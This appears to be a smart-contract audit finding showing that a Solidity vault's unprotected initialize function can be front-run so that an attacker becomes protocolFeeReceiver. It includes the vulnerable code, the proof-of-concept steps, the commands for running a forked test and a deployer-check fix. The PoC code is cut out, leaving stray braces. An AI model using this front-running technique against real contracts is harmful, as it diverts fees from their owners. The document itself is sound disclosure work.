# Vault::initialize can be frontrunned allowing anyone to change vault's parameter such as  protocolFeeReceiver

## Summary
Vault::initialize can be frontrunned allowing anyone to change vault's parameter such as  protocolFeeReceiver  

## Vulnerability Detail
Vault::initialize doesnt have a mechanism (such as msg.sender check) that protect this method from unauthorized calls, allowing anyone to frontrun and initialize the vault with arbitrary parameters.
The only condition is that this vault's isFactoryCreated value equals to false, this value is set in constructor
```solidity
  constructor(bool _initialize) {
    isFactoryCreated = _initialize;
  }
```
And used in initialize method
```solidity
  function initialize(InitializationParams memory params) external {
    require(isFactoryCreated != true, "MBF");	//<@ only check
    // Only run once by vault factory in atomic operation right after cloning, then fixedSideCapacity is set
    require(fixedSideCapacity == 0, "ORO");
```
If this is the case (vault.isFactoryCreated = false), an attacker could call initialize with arbitrary parameters, such as setting himself as protocolFeeReceiver using a higher gas price to front run legitimate initialization call.  

To demonstrate this issue the following PoC is provided.  
Deployer D address deploys a new vault with initialize constructor param set to false.  
Deployer next calls vault::initialize setting himself as protocolFeeReceiver  
Attacker front runs deployer initialize call setting attacker address as protocolFeeReceiver  
Deployer initialize call failed and attacker is now the protocolFeeReceiver

        })
      })

})
```  

Next start a forked node (in this case anvil was used )
```bash
reset;anvil --fork-url https://rpc.ankr.com/eth --fork-block-number  18562954 --fork-chain-id 31337 --block-base-fee-per-gas 10000
```
Execute this test with:
```bash
npx hardhat test test/LVFrontrunInitialize.test.ts --network localhost
```
Observe deposit call is front runned and now attacker is the protocolFeeReceiver address    

## Impact
Vault integrity is impacted because unauthorized arbitrary parameter changes are possible

## Tool used

Manual Review

## Recommendation
Implement an additional check to only allow initialization from vault deployer:
```solidity
	address deployer;  //<@ new var
	constructor(bool _initialize) {
		isFactoryCreated = _initialize;
		deployer = msg.sender;
	}

	function initialize(InitializationParams memory params) external {
		//...
		require(isFactoryCreated != true && msg.sender == deployer, "MBF"); //<@ additional check
```
